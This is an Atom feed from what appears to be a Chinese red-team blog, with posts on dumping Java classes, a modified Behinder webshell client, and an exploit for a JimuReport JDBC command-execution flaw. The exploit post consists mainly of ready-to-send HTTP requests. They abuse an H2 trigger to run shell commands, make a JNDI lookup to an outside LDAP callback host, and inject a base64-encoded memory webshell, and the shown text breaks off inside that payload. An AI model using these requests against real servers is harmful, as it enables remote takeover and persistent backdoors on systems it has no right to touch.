<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://1oecho.github.io</id>
    <title></title>
    <updated>2023-12-14T07:36:27.026Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://1oecho.github.io"/>
    <link rel="self" href="https://1oecho.github.io/atom.xml"/>
    <logo>https://1oecho.github.io/images/avatar.png</logo>
    <icon>https://1oecho.github.io/favicon.ico</icon>
    <rights>All rights reserved 2023, </rights>
    <entry>
        <title type="html"><![CDATA[某Java工具逆向分析记录]]></title>
        <id>https://1oecho.github.io/m8USU7X8p/</id>
        <link href="https://1oecho.github.io/m8USU7X8p/">
        </link>
        <updated>2023-12-14T06:58:28.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x01-大致情况">0x01 大致情况:</h2>
<ul>
<li>获取到一个修改版的Java工具, 想研究下具体的功能,学习一下, 直接反编译,发现存在自定义的 ClassLoader  具体功能都是 通过ClassLoader 去加载 bytecode 来实现的.直接反编译并不能直接查看功能代码</li>
</ul>
<figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/202312141534821.png" alt="img" loading="lazy"></figure>
<h2 id="0x02-反编译思路">0x02 反编译思路</h2>
<p>jar 包最终运行肯定加载的到 jvm 虚拟机当中,我们的目的是,从虚拟机中 dump 出所有的解密后的 Class</p>
<p>搜索相关成熟的实现,发现阿里的  <strong>Java 应用诊断利器Arthas</strong></p>
<figure data-type="image" tabindex="2"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/202312141534173.png" alt="img" loading="lazy"></figure>
<p>仔细看了下功能发现,有相关实现的命令 dump 但是他只支持部分的 dump</p>
<figure data-type="image" tabindex="3"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/202312141534237.png" alt="img" loading="lazy"></figure>
<p>通过我们已知的关键字 dump 下,发现可以成功看到对应的类文件, 测试发现只能 dump 个别的类,而且限制了数量:</p>
<figure data-type="image" tabindex="4"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/202312141534374.png" alt="img" loading="lazy"></figure>
<p>测试 dump 一个 Class 看下有没有问题  :</p>
<figure data-type="image" tabindex="5"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/202312141534735.png" alt="img" loading="lazy"></figure>
<p>但是我们的目的是dump所有Class. 关键字搜索了下,发现 <code>github issus</code> 发现 有同样的问题:</p>
<figure data-type="image" tabindex="6"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/202312141534378.png" alt="image.png" loading="lazy"></figure>
<p>作者也表明没有这样具体的功能:</p>
<figure data-type="image" tabindex="7"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/202312141534747.png" alt="img" loading="lazy"></figure>
<p>后续查看了下作者的 github, 其他项目 发现了这个工具 <code>https://github.com/hengyunabc/dumpclass</code></p>
<figure data-type="image" tabindex="8"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/202312141534886.png" alt="img" loading="lazy"></figure>
<p>直接利用下,成功dump <em><strong>*core*.*</strong></em></p>
<figure data-type="image" tabindex="9"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/202312141534705.png" alt="img" loading="lazy"></figure>
<p>尝试dump <em><strong>*shell*</strong></em>*</p>
<figure data-type="image" tabindex="10"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/202312141534710.png" alt="image.png" loading="lazy"></figure>
<ul>
<li>最终成功获取到 Java 工具的所有功能代码:</li>
</ul>
<figure data-type="image" tabindex="11"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/202312141535753.png" alt="img" loading="lazy"></figure>
<h2 id="0x03-参考工具">0x03 参考工具</h2>
<ul>
<li>
<p><a href="https://github.com/hengyunabc/dumpclass">GitHub - hengyunabc/dumpclass: Dump classes from running JVM process.</a></p>
</li>
<li>
<p><a href="https://arthas.aliyun.com/">Arthas</a></p>
</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[红队开发: Behinder3-Beta11 实战下的二次开发 （5）]]></title>
        <id>https://1oecho.github.io/Wb2nktU9J/</id>
        <link href="https://1oecho.github.io/Wb2nktU9J/">
        </link>
        <updated>2023-11-21T15:01:17.000Z</updated>
        <content type="html"><![CDATA[<h2 id="最终结果">最终结果:</h2>
<h2 id="代理验证">代理验证</h2>
<figure data-type="image" tabindex="1"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141245659.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141245659.png" alt="img" loading="lazy"></a></figure>
<h2 id="单目标-存活检测">单目标-存活检测</h2>
<figure data-type="image" tabindex="2"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141245989.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141245989.png" alt="img" loading="lazy"></a></figure>
<h2 id="命令执行嫖来的">命令执行（嫖来的）</h2>
<figure data-type="image" tabindex="3"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141245452.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141245452.png" alt="img" loading="lazy"></a></figure>
<h2 id="jni-windows-命令执行-嫖来的">JNI Windows 命令执行 （嫖来的）</h2>
<figure data-type="image" tabindex="4"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141245739.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141245739.png" alt="img" loading="lazy"></a></figure>
<h2 id="内存马管理嫖来的">内存马管理（嫖来的）</h2>
<figure data-type="image" tabindex="5"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141245404.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141245404.png" alt="img" loading="lazy"></a></figure>
<h2 id="代理管理">代理管理</h2>
<h3 id="diy_狗洞">diy_狗洞</h3>
<figure data-type="image" tabindex="6"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141249357.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141249357.png" alt="image-20220914124941310" loading="lazy"></a></figure>
<h3 id="stowaway">Stowaway</h3>
<figure data-type="image" tabindex="7"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141246410.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141246410.png" alt="image-20220914124651369" loading="lazy"></a></figure>
<h3 id="spp-多协议代理-quic算法实现的tcp代理">Spp 多协议代理 （Quic算法实现的TCP代理）</h3>
<ul>
<li>正向代理</li>
</ul>
<figure data-type="image" tabindex="8"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141245356.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141245356.png" alt="img" loading="lazy"></a></figure>
<ul>
<li>反向代理</li>
</ul>
<figure data-type="image" tabindex="9"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141248314.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141248314.png" alt="image-20220914124810279" loading="lazy"></a></figure>
<h3 id="代理情况记录">代理情况记录：</h3>
<figure data-type="image" tabindex="10"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141248552.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202209141248552.png" alt="image-20220914124858502" loading="lazy"></a></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[漏洞利用: 某开源报表 JDBC命令执行漏洞利用]]></title>
        <id>https://1oecho.github.io/KHsGtk94v/</id>
        <link href="https://1oecho.github.io/KHsGtk94v/">
        </link>
        <updated>2023-11-21T14:04:07.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x00-系统占比">0x00 系统占比：</h2>
<figure data-type="image" tabindex="1"><img src="https://p.ipic.vip/gkc855.png" alt="img" loading="lazy"></figure>
<h2 id="0x01-h2-代码执行">0x01 H2 代码执行</h2>
<ul>
<li>判断是否存在依赖</li>
</ul>
<pre><code class="language-matlab">POST /jmreport/testConnection HTTP/1.1
Host: xxxxxx
Content-Length: 301
Accept: application/json, text/plain, */*
X-Access-Token: null
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
token: null
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{&quot;dbType&quot;:&quot;H2&quot;,&quot;dbDriver&quot;:&quot;org.h2.Driver&quot;,&quot;dbUrl&quot;:&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n java.lang.Runtime.getRuntime().exec('cmd /c ping jm.tk2zx.eyes.sh')$$&quot;,&quot;dbUsername&quot;:&quot;jeecgbootbpm&quot;,&quot;dbPassword&quot;:&quot;jeecg196283&quot;}
</code></pre>
<ul>
<li>漏洞EXP</li>
</ul>
<pre><code class="language-matlab">POST /jmreport/testConnection HTTP/1.1
Host: xxxxxx
Content-Length: 301
Accept: application/json, text/plain, */*
X-Access-Token: null
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
token: null
Content-Type: application/json;charset=UTF-8menuType=chartinfo
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1678245989; Hm_lpvt_5819d05c0869771ff6e6a81cdec5b2e8=1678257760
Connection: close

{&quot;dbType&quot;:&quot;H2&quot;,&quot;dbDriver&quot;:&quot;org.h2.Driver&quot;,&quot;dbUrl&quot;:&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n java.lang.Runtime.getRuntime().exec('cmd /c ping jm.tk2zx.eyes.sh')$$&quot;,&quot;dbUsername&quot;:&quot;jeecgbootbpm&quot;,&quot;dbPassword&quot;:&quot;jeecg196283&quot;}
</code></pre>
<ul>
<li>H2 代码执行：</li>
</ul>
<figure data-type="image" tabindex="2"><img src="https://p.ipic.vip/u00x3c.png" alt="img" loading="lazy"></figure>
<ul>
<li>JNDI注入</li>
</ul>
<pre><code class="language-matlab">POST /jmreport/testConnection HTTP/1.1
Host: 192.168.2.130:8085
Content-Length: 330
Accept: application/json, text/plain, */*
X-Access-Token: null
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
token: null
Content-Type: application/json;charset=UTF-8
menuType=chartinfo
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{&quot;dbType&quot;:&quot;H2&quot;,&quot;dbDriver&quot;:&quot;org.h2.Driver&quot;,&quot;dbUrl&quot;:&quot;jdbc:h2:mem:testa;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n new javax.naming.InitialContext().lookup('ldap://b0c0fbizh70qgg2yh1cxngffz65xtvhk.oastify.com')$$&quot;,&quot;dbUsername&quot;:&quot;jeecgbootbpm&quot;,&quot;dbPassword&quot;:&quot;jeecg196283&quot;}
</code></pre>
<ul>
<li>无依赖注入内存马：</li>
</ul>
<pre><code class="language-matlab">POST /jmreport/testConnection HTTP/1.1
Host: 192.168.2.130:8085
Content-Length: 24012
Accept: application/json, text/plain, */*
X-Access-Token: null
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
token: null
Content-Type: application/jsonß;charset=UTF-8
menuType=chartinfo
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{&quot;dbType&quot;:&quot;H2&quot;,&quot;dbDriver&quot;:&quot;org.h2.Driver&quot;,&quot;dbUrl&quot;:&quot;jdbc:h2:mem:testa;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nvar classLoader = java.lang.Thread.currentThread().getContextClassLoader()\\;try{classLoader.loadClass('Injext').newInstance()\\;}catch (e){var clsString = classLoader.loadClass('java.lang.String')\\;var bytecodeBase64 = 'yv66vgAAADQArgoADQBcCABdCABeCgAGAF8IADUHAGAHAGEKAAYAYgcAYwgAZAcAZQoAZgBnBwBoCgBpAGoHAGsKAA8AbAoAZgBtBwBuCABvCwASAHAHAHEHAHIIAHMIAEUKAAYAdAoAdQBnCgB1AHYHAHcHAHgKAAYAeQoAHQB6CgB7AHwKAHsAfQcAfggAfwcAgAcASAkAgQCCCACDCgCBAIQKACIAhQoAHACGBwCHBwCIAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAhMSW5qZXh0OwEACDxjbGluaXQ+AQAYZ2V0V2ViQXBwbGljYXRpb25Db250ZXh0AQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFlAQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAcUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAWYWJzdHJhY3RIYW5kbGVyTWFwcGluZwEAQExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvQWJzdHJhY3RIYW5kbGVyTWFwcGluZzsBAB9EZWZhdWx0QW5ub3RhdGlvbkhhbmRsZXJNYXBwaW5nAQACZTIBACpMb3JnL3NwcmluZ2ZyYW1ld29yay9iZWFucy9CZWFuc0V4Y2VwdGlvbjsBABNSZXF1ZXN0Q29udGV4dFV0aWxzAQAHY29udGV4dAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dDsBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABNhZGFwdGVkSW50ZXJjZXB0b3JzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAFYnl0ZXMBAAJbQgEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAJtMAEAA2I2NAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAKUxqYXZhL3V0aWwvQXJyYXlMaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQANU3RhY2tNYXBUYWJsZQcAgAcAYAcAYwcAiQcAbgcAcgcAcQcAhwEAClNvdXJjZUZpbGUBAAtJbmpleHQuamF2YQwALQAuATMkeXY2NnZnQUFBRFFDRGdvQWxBRUlDQUVKQ1FDVEFRb0lBSmNKQUpNQkN3Y0JEQW9BQmdFSUNnQUdBUTBLQUFZQkRnb0Frd0VQQ1FDVEFSQUlBUkVLQUJNQkVnZ0JFd29BRXdFVUNnRVZBUllLQUJVQkZ3Z0JHQWNCR1FjQkdnY0JHd2NBcXdjQkhBZ0JIUW9BRXdFZUNBRWZDQUVnQ2dFaEFTSUtBQlFCSXdvQUZBRWtDZ0VoQVNVSEFTWUtBU0VCSndvQUlBRW9DZ0FnQVNrS0FCUUJLZ2dCS3dnQkxBZ0JMUWdCTGdnQkx3c0JNQUV4Q0FFeUNnQVVBVE1IQVRRSEFUVUlBTG9IQVRZSEFUY0lBTHdJQVRnSUFNQUtBQlFCT1FnQk9nb0JPd0U4Q2dBVUFUMElBVDRLQUJRQlB3Z0JRQWdCUVFnQlFnY0JRd29CUkFGRkNnRkVBVVlLQVVjQlNBb0FQZ0ZKQ0FGS0NnQStBVXNLQUQ0QlRBb0FNQUZOQ2dGT0FVOElBVkFMQVRBQlVRZ0JVZ29BRkFGVEJ3RlVDZ0JNQVFnS0FDMEJWUWdBNlFvQVRBRldDQURyQ0FEWUN3RXdBVmNLQVZnQldRZ0JXZ29BRXdGYkNnRmNBVjBLQVZ3QlhnY0JYd2dBelFjQllBb0FXd0ZoQ0FEUkJ3RmlDZ0JlQVdNTEFXUUJaUXNCWmdGbkN3Rm1BV2dIQVdvTEFHTUJhd2dCYkFnQmJRb0FGQUZ1Q3dCakFXOEhBWEFLQUdrQmNRZ0JjZ29BYVFGekNBRjBDd0YxQVhZSUFYY0tBWGdCZVFjQmVnb0FjUUY3Q2dGNEFYd0lBWDBJQVg0SkFYOEJnQW9BRXdHQkNnRVZBVjBIQVlJS0FIa0JDQW9BZVFHRENnRjRBWVFLQVlVQmhnb0JoUUdIQ2dGL0FZZ0tBQlVCVXdnQmlRc0JNQUdLQ2dDVEFZc0tBSk1CakFrQWt3R05Cd0dPQndHUENnQ0dBWkFIQVpFSEFaSUtBSW9CQ0FzQmt3Rk5DZ0FVQVpRS0FVNEJsUW9BRlFFT0NnQ0tBWllLQUpNQmx3b0FGQUdZQndHWkJ3R2FBUUFDZUdNQkFCSk1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQVJ3WVhOekFRQURiV1ExQVFBSGNHRjViRzloWkFFQUVVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUdQR2x1YVhRK0FRQURLQ2xXQVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQURoTWVYTnZjMlZ5YVdGc0wzQmhlV3h2WVdSekwzUmxiWEJzWVhSbGN5OVRjSEpwYm1kSmJuUmxjbU5sY0hSdmNsUmxiWEJzWVhSbE93RUFER0poYzJVMk5FUmxZMjlrWlFFQUZpaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BXMElCQUFka1pXTnZaR1Z5QVFBU1RHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0FRQUdZbUZ6WlRZMEFRQUJaUUVBRlV4cVlYWmhMMnhoYm1jdlJYaGpaWEIwYVc5dU93RUFBbUp6QVFBRmRtRnNkV1VCQUFKYlFnRUFEVk4wWVdOclRXRndWR0ZpYkdVSEFSb0hBUndCQUFwRmVHTmxjSFJwYjI1ekFRQW1LRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFGdEFRQWRUR3BoZG1FdmMyVmpkWEpwZEhrdlRXVnpjMkZuWlVScFoyVnpkRHNCQUFGekFRQURjbVYwQVFBTVltRnpaVFkwUlc1amIyUmxBUUFXS0Z0Q0tVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFCMFZ1WTI5a1pYSUJBQWx3Y21WSVlXNWtiR1VCQUdRb1RHcGhkbUY0TDNObGNuWnNaWFF2YUhSMGNDOUlkSFJ3VTJWeWRteGxkRkpsY1hWbGMzUTdUR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnlkbXhsZEZKbGMzQnZibk5sTzB4cVlYWmhMMnhoYm1jdlQySnFaV04wT3lsYUFRQUtaMlYwVW1WeGRXVnpkQUVBR2t4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5TlpYUm9iMlE3QVFBTFoyVjBVbVZ6Y0c5dWMyVUJBQVJqYldSekFRQVRXMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBQm5KbGMzVnNkQUVBQTJOdFpBRUFCRzVsZUhRQkFBVkZiblJ5ZVFFQURFbHVibVZ5UTJ4aGMzTmxjd0VBRlV4cVlYWmhMM1YwYVd3dlRXRndKRVZ1ZEhKNU93RUFDSEJoY21GdFMyVjVBUUFPY0dGeVlXMVdZV3gxWlV4cGMzUUJBQlZNYW1GMllTOTFkR2xzTDBGeWNtRjVUR2x6ZERzQkFBVm1hV1ZzWkFFQUdVeHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOUdhV1ZzWkRzQkFBdHlaV0ZzVW1WeGRXVnpkQUVBSjB4dmNtY3ZZWEJoWTJobEwyTmhkR0ZzYVc1aEwyTnZibTVsWTNSdmNpOVNaWEYxWlhOME93RUFFbU52ZVc5MFpWSmxjWFZsYzNSR2FXVnNaQUVBRFdOdmVXOTBaVkpsY1hWbGMzUUJBQnRNYjNKbkwyRndZV05vWlM5amIzbHZkR1V2VW1WeGRXVnpkRHNCQUFwd1lYSmhiV1YwWlhKekFRQW9URzl5Wnk5aGNHRmphR1V2ZEc5dFkyRjBMM1YwYVd3dmFIUjBjQzlRWVhKaGJXVjBaWEp6T3dFQUQzQmhjbUZ0U0dGemFGWmhiSFZsY3dFQUNIQmhjbUZ0VFdGd0FRQVpUR3BoZG1FdmRYUnBiQzlNYVc1clpXUklZWE5vVFdGd093RUFDR2wwWlhKaGRHOXlBUUFVVEdwaGRtRXZkWFJwYkM5SmRHVnlZWFJ2Y2pzQkFBdHdZV2RsUTI5dWRHVjRkQUVBRTB4cVlYWmhMM1YwYVd3dlNHRnphRTFoY0RzQkFBZHpaWE56YVc5dUFRQWdUR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnpjMmx2YmpzQkFBRnJBUUFCWXdFQUZVeHFZWFpoZUM5amNubHdkRzh2UTJsd2FHVnlPd0VBQm0xbGRHaHZaQUVBRG1WMmFXeGpiR0Z6YzE5aWVYUmxBUUFKWlhacGJHTnNZWE56QVFBT2RYSnNRMnhoYzNOTWIyRmtaWElCQUJsTWFtRjJZUzl1WlhRdlZWSk1RMnhoYzNOTWIyRmtaWEk3QVFBSlpHVm1UV1YwYUc5a0FRQUdZWEp5VDNWMEFRQWZUR3BoZG1FdmFXOHZRbmwwWlVGeWNtRjVUM1YwY0hWMFUzUnlaV0Z0T3dFQUFXWUJBQVJrWVhSaEFRQUxiR0Z6ZEZKbGNYVmxjM1FCQUF4c1lYTjBVbVZ6Y0c5dWMyVUJBQWR5WlhGMVpYTjBBUUFuVEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjWFZsYzNRN0FRQUljbVZ6Y0c5dWMyVUJBQ2hNYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnpjRzl1YzJVN0FRQUhhR0Z1Wkd4bGNnRUFGa3h2WTJGc1ZtRnlhV0ZpYkdWVWVYQmxWR0ZpYkdVQkFGSk1hbUYyWVM5MWRHbHNMMDFoY0NSRmJuUnllVHhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenRNYW1GMllTOTFkR2xzTDBGeWNtRjVUR2x6ZER4TWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzK096NDdBUUFwVEdwaGRtRXZkWFJwYkM5QmNuSmhlVXhwYzNROFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN1Bqc0JBR2hNYW1GMllTOTFkR2xzTDBsMFpYSmhkRzl5UEV4cVlYWmhMM1YwYVd3dlRXRndKRVZ1ZEhKNVBFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk8weHFZWFpoTDNWMGFXd3ZRWEp5WVhsTWFYTjBQRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PejQ3UGpzK093Y0JHd2NCbXdjQXZnY0JWQWNCbkFjQm1RY0JuUWNCbmdjQm53Y0JYd2NCWUFjQm9BY0JZZ2NCb1FjQmFnY0JjQUVBQVhnQkFBY29XMEphS1Z0Q0FRQUJXZ2NCb2dFQUNsTnZkWEpqWlVacGJHVUJBQjVUY0hKcGJtZEpiblJsY21ObGNIUnZjbFJsYlhCc1lYUmxMbXBoZG1FTUFKc0FuQUVBRUdZMU5XVXlOemMwTmpnNE5HRTBZbVFNQUpVQWxnd0Fsd0NXQVFBWGFtRjJZUzlzWVc1bkwxTjBjbWx1WjBKMWFXeGtaWElNQWFNQnBBd0JwUUdtREFDWUFMQU1BSmdBbGdFQUVHcGhkbUV1ZFhScGJDNUNZWE5sTmpRTUFhY0JxQUVBQ21kbGRFUmxZMjlrWlhJTUFha0JxZ2NCbXd3QnF3R3NEQUd0QWE0QkFBWmtaV052WkdVQkFBOXFZWFpoTDJ4aGJtY3ZRMnhoYzNNQkFCQnFZWFpoTDJ4aGJtY3ZVM1J5YVc1bkFRQVFhbUYyWVM5c1lXNW5MMDlpYW1WamRBRUFFMnBoZG1FdmJHRnVaeTlGZUdObGNIUnBiMjRCQUJaemRXNHViV2x6WXk1Q1FWTkZOalJFWldOdlpHVnlEQUd2QWJBQkFBeGtaV052WkdWQ2RXWm1aWElCQUFOTlJEVUhBYkVNQWJJQnN3d0J0QUcxREFHMkFiY01BYmdCdVFFQUZHcGhkbUV2YldGMGFDOUNhV2RKYm5SbFoyVnlEQUc2QWJVTUFKc0J1d3dCcFFHOERBRzlBYVlCQUFwblpYUkZibU52WkdWeUFRQU9aVzVqYjJSbFZHOVRkSEpwYm1jQkFCWnpkVzR1Yldsell5NUNRVk5GTmpSRmJtTnZaR1Z5QVFBR1pXNWpiMlJsQVFBSFVtVm1aWEpsY2djQm5Rd0J2Z0N3QVFBWGFIUjBjSE02THk5M2QzY3VaMjl2WjJ4bExtTnZiUzhNQWI4QndBRUFLMjl5Wnk5aGNHRmphR1V2WTJGMFlXeHBibUV2WTI5dWJtVmpkRzl5TDFKbGNYVmxjM1JHWVdOaFpHVUJBQ05xWVhaaGVDOXpaWEoyYkdWMEwxTmxjblpzWlhSU1pYRjFaWE4wVjNKaGNIQmxjZ0VBTEc5eVp5OWhjR0ZqYUdVdlkyRjBZV3hwYm1FdlkyOXVibVZqZEc5eUwxSmxjM0J2Ym5ObFJtRmpZV1JsQVFBa2FtRjJZWGd2YzJWeWRteGxkQzlUWlhKMmJHVjBVbVZ6Y0c5dWMyVlhjbUZ3Y0dWeUFRQU5lQzFqYkdsbGJuUXRaR0YwWVF3QndRSENBUUFIYjNNdWJtRnRaUWNCd3d3QnhBQ3dEQUhGQWFZQkFBTjNhVzRNQWNZQnh3RUFBaTlqQVFBSkwySnBiaTlpWVhOb0FRQUNMV01CQUJGcVlYWmhMM1YwYVd3dlUyTmhibTVsY2djQnlBd0J5UUhLREFITEFjd0hBYzBNQWM0Qnp3d0Ftd0hRQVFBQ1hFRU1BZEVCMGd3QXdRR21EQUhUQWRRSEFkVU1BZFlCMXdFQUNISmxZbVY1YjI1a0RBR3BBYVlCQUFSUVQxTlVEQUhZQWRrQkFCRnFZWFpoTDNWMGFXd3ZTR0Z6YUUxaGNBd0IyZ0hiREFIY0FkME1BZDRCM3djQjRBd0I0UUdtQVFBQURBSGlBZU1IQVo4TUFlUUI1UXdCNWdIbkFRQWxiM0puTDJGd1lXTm9aUzlqWVhSaGJHbHVZUzlqYjI1dVpXTjBiM0l2VW1WeGRXVnpkQUVBR1c5eVp5OWhjR0ZqYUdVdlkyOTViM1JsTDFKbGNYVmxjM1FNQWVnQjZRRUFGMnBoZG1FdmRYUnBiQzlNYVc1clpXUklZWE5vVFdGd0RBSHFBZXNIQWV3TUFOUUI3UWNCb1F3QjdnSENEQURCQWJBSEFlOEJBQk5xWVhaaEwzVjBhV3d2VFdGd0pFVnVkSEo1REFId0FiQUJBQUVnQVFBQkt3d0I4UUh5REFIekFiQUJBQk5xWVhaaEwzVjBhV3d2UVhKeVlYbE1hWE4wREFIMEFiY0JBQUU5REFIbUFmVUJBQUYxQndHY0RBSDJBZmNCQUFOQlJWTUhBYUlNQWJJQitBRUFIMnBoZG1GNEwyTnllWEIwYnk5emNHVmpMMU5sWTNKbGRFdGxlVk53WldNTUFKc0IrUXdCK2dIN0FRQVZhbUYyWVM1c1lXNW5Ma05zWVhOelRHOWhaR1Z5QVFBTFpHVm1hVzVsUTJ4aGMzTUhBZndNQWYwQW1nd0IvZ0dxQVFBV2MzVnVMMjFwYzJNdlFrRlRSVFkwUkdWamIyUmxjZ3dCSHdDakRBSC9BZ0FIQWdFTUFnSUNBd3dDQkFJRkRBSUdBZ2NCQUFobmIyUjZhV3hzWVF3Q0NBQ3dEQUNpQUtNTUFRSUJBd3dBbVFDYUFRQVhhbUYyWVM5dVpYUXZWVkpNUTJ4aGMzTk1iMkZrWlhJQkFBeHFZWFpoTDI1bGRDOVZVa3dNQUpzQ0NRRUFGV3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2dFQUhXcGhkbUV2YVc4dlFubDBaVUZ5Y21GNVQzVjBjSFYwVTNSeVpXRnRCd0dlREFJS0Fnc01BZ3dCMXd3Q0RRRzFEQUMxQUxZTUFnb0J2QUVBTm5semIzTmxjbWxoYkM5d1lYbHNiMkZrY3k5MFpXMXdiR0YwWlhNdlUzQnlhVzVuU1c1MFpYSmpaWEIwYjNKVVpXMXdiR0YwWlFFQVFXOXlaeTl6Y0hKcGJtZG1jbUZ0WlhkdmNtc3ZkMlZpTDNObGNuWnNaWFF2YUdGdVpHeGxjaTlJWVc1a2JHVnlTVzUwWlhKalpYQjBiM0pCWkdGd2RHVnlBUUFZYW1GMllTOXNZVzVuTDNKbFpteGxZM1F2VFdWMGFHOWtBUUFlYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWE56YVc5dUFRQWxhbUYyWVhndmMyVnlkbXhsZEM5b2RIUn